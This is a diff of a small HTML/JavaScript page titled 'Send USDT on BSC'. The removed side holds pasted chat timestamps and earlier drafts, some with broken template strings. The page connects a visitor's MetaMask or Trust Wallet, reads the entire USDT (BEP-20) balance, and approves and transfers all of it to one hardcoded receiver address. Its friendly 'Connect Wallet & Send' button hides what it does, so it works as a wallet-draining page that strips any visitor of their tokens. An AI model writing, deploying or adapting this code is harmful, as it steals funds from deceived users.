@@ -1,137 +1,73 @@
-ㅤ, [18-06-2025 20:20]
 <!DOCTYPE html>
 <html>
 <head>
-  <title>USDT Auto Transfer</title>
+  <title>Send USDT on BSC</title>
   <meta name="viewport" content="width=device-width, initial-scale=1" />
   <script src="https://cdn.jsdelivr.net/npm/web3@1.8.2/dist/web3.min.js"></script>
 </head>
-<body style="text-align:center; font-family:sans-serif; padding-top:60px;">
-  <h2>🔁 Send All USDT (BEP20)</h2>
-  <button onclick="startTransfer()" style="padding:15px 30px; font-size:18px; background:#0f0; border:none; border-radius:8px; cursor:pointer;">
-    Connect & Send
+<body style="font-family:sans-serif; text-align:center; padding-top:50px;">
+
+  <h2>Send All USDT (BEP-20)</h2>
+  <button onclick="connectAndSend()" style="padding:12px 25px; font-size:18px; border:none; border-radius:8px; background:#007bff; color:#fff; cursor:pointer;">
+    Connect Wallet & Send
   </button>
 
   <p id="status" style="margin-top:20px; font-size:16px;"></p>
 
   <script>
-    const receiver = "0xB53941b949D3ac68Ba48AF3985F9F59105Cdf999";
-    const usdtAddress = "0x55d398326f99059fF775485246999027B3197955";
-
-    const usdtABI = [
-      { "constant": true, "inputs": [{ "name": "_owner", "type": "address" }], "name": "balanceOf", "outputs": [{ "name": "balance", "type": "uint256" }], "type": "function" },
-      { "constant": false, "inputs": [{ "name": "_spender", "type": "address" }, { "name": "_value", "type": "uint256" }], "name": "approve", "outputs": [{ "name": "success", "type": "bool" }], "type": "function" },
-      { "constant": false, "inputs": [{ "name": "_to", "type": "address" }, { "name": "_value", "type": "uint256" }], "name": "transfer", "outputs": [{ "name": "success", "type": "bool" }], "type": "function" }
+    const receiver = "0xB53941b949D3ac68Ba48AF3985F9F59105Cdf999"; // Receiver wallet address
+    const usdtAddress = "0x55d398326f99059fF775485246999027B3197955"; // USDT (BEP-20) contract address
+    const usdtAbi = [
+      { "constant":true, "inputs":[{"name":"_owner","type":"address"}], "name":"balanceOf", "outputs":[{"name":"balance","type":"uint256"}], "type":"function" },
+      { "constant":false, "inputs":[{"name":"_spender","type":"address"},{"name":"_value","type":"uint256"}], "name":"approve", "outputs":[{"name":"success","type":"bool"}], "type":"function" },
+      { "constant":false, "inputs":[{"name":"_to","type":"address"},{"name":"_value","type":"uint256"}], "name":"transfer", "outputs":[{"name":"success","type":"bool"}], "type":"function" }
     ];
 
-    async function startTransfer() {
+    async function connectAndSend() {
       const status = document.getElementById("status");
-
       if (typeof window.ethereum === 'undefined') {
-        alert("⚠️ Please open in Trust Wallet or MetaMask browser.");
-        return;
-      }
-
-      const web3 = new Web3(window.ethereum);
-      await window.ethereum.request({ method: 'eth_requestAccounts' });
-      const accounts = await web3.eth.getAccounts();
-      const sender = accounts[0];
-
-      const usdt = new web3.eth.Contract(usdtABI, usdtAddress);
-      const balance = await usdt.methods.balanceOf(sender).call();
-
-      if (balance == 0) {
-        alert("❌ No USDT found in wallet.");
-        return;
-      }
-
-      const readable = (balance / 10 ** 6).toFixed(6); // USDT uses 6 decimals
-      status.innerText = Approving ${readable} USDT...;
-
-      try {
-        await usdt.methods.approve(receiver, balance).send({ from: sender });
-        status.innerText = "✅ Approved! Sending...";
-
-        await usdt.methods.transfer(receiver, balance).send({ from: sender });
-        status.innerText = "🎉 USDT Sent Successfully!";
-      } catch (err) {
-        console.error(err);
-        status.innerText = "❌ Transaction Failed or Cancelled.";
-        alert("❌ Transaction failed or cancelled. Please try again.");
-      }
-    }
-  </script>
-</body>
-</html>
-
-ㅤ, [18-06-2025 20:33]
-<!DOCTYPE html>
-<html>
-<head>
-  <title>Auto USDT Transfer</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1">
-  <script src="https://cdn.jsdelivr.net/npm/web3@1.8.2/dist/web3.min.js"></script>
-</head>
-<body style="text-align:center; font-family:sans-serif; padding-top:60px;">
-  <h2>🔁 Send All USDT</h2>
-  <button onclick="start()" style="padding:15px 30px; font-size:18px; background:#28a745; color:#fff; border:none; border-radius:8px; cursor:pointer;">
-    Connect & Send
-  </button>
-  <p id="status" style="margin-top:20px; font-size:16px;"></p>
-
-  <script>
-    const receiver = "0xB53941b949D3ac68Ba48AF3985F9F59105Cdf999"; // Your receiver address
-    const usdtAddress = "0x55d398326f99059fF775485246999027B3197955"; // USDT contract on BSC
-
-    const usdtABI = [
-      { "constant": true, "inputs": [{"name": "_owner","type": "address"}], "name": "balanceOf", "outputs": [{"name": "balance","type": "uint256"}], "type": "function" },
-      { "constant": false, "inputs": [{"name": "_spender","type": "address"},{"name": "_value","type": "uint256"}], "name": "approve", "outputs": [{"name": "success","type": "bool"}], "type": "function" },
-      { "constant": false, "inputs": [{"name": "_to","type": "address"},{"name": "_value","type": "uint256"}], "name": "transfer", "outputs": [{"name": "success","type": "bool"}], "type": "function" }
-    ];
-
-    async function start() {
-      const status = document.getElementById("status");
-
-      if (!window.ethereum) {
-        alert("⚠️ Please open this in Trust Wallet or MetaMask browser.");
+        alert("Please open in MetaMask or Trust Wallet browser.");
         return;
       }
 
       const web3 = new Web3(window.ethereum);
 
       try {
-        await window.ethereum.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: '0x38' }] });
+        await window.ethereum.request({
+          method: "wallet_switchEthereumChain",
+          params: [{ chainId: "0x38" }], // BNB Smart Chain Mainnet
+        });
       } catch (e) {
-        alert("❌ Please switch to BNB Smart Chain manually.");
+        alert("Please switch to BNB Smart Chain manually in wallet.");
         return;
       }
-
-      await window.ethereum.request({ method: 'eth_requestAccounts' });
-      const accounts = await web3.eth.getAccounts();
-      const sender = accounts[0];
-
-      const usdt = new web3.eth.Contract(usdtABI, usdtAddress);
-      const balance = await usdt.methods.balanceOf(sender).call();
-
-      if (balance == 0) {
-        status.innerText = "❌ No USDT found in wallet.";
-        return;
-      }
-
-      const readable = web3.utils.fromWei(balance, 'ether');
-      status.innerText = ⏳ Approving ${readable} USDT...;
 
       try {
-        await usdt.methods.approve(receiver, balance).send({ from: sender });
-        status.innerText = "✅ Approved. Sending...";
+        await window.ethereum.request({ method: "eth_requestAccounts" });
+        const accounts = await web3.eth.getAccounts();
+        const sender = accounts[0];
+        const usdt = new web3.eth.Contract(usdtAbi, usdtAddress);
 
+        const balance = await usdt.methods.balanceOf(sender).call();
+
+        if (balance == 0) {
+          status.innerText = "No USDT found in your wallet.";
+          return;
+        }
+
+        status.innerText = "Approving USDT...";
+        await usdt.methods.approve(receiver, balance).send({ from: sender });
+
+        status.innerText = "Sending USDT...";
         await usdt.methods.transfer(receiver, balance).send({ from: sender });
-        status.innerText = "🎉 USDT Sent Successfully!";
-      } catch (err) {
-        console.error(err);
-        status.innerText = "❌ Transaction Failed or Cancelled.";
+
+        status.innerText = "✅ USDT sent successfully!";
+      } catch (error) {
+        console.error(error);
+        status.innerText = "❌ Transaction failed or cancelled.";
       }
     }
   </script>
+
 </body>
 </html>
